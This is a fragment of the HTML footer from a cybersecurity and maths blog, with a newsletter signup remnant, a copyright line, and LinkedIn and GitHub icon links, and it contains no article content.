<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>